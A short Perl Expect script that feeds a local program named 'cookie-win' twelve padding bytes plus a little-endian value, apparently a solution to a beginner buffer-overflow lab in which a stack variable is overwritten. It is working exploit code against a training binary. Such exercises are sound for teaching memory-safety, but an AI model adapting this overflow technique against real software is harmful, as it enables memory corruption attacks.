#!/usr/bin/env perl

use strict;
use Expect;

my $timeout = 10; 
my $buf = "P" x 12;
my $cookie = "\x44\x43\x42\x41";

my $input = $buf.$cookie."\n";
my $command = "./cookie-win ";

my $exp = Expect->spawn($command) or die "Cannot spawn cookie-win command \n";

$exp->expect($timeout, ["please provice input"]); 
$exp->send($input);
$exp->soft_close();
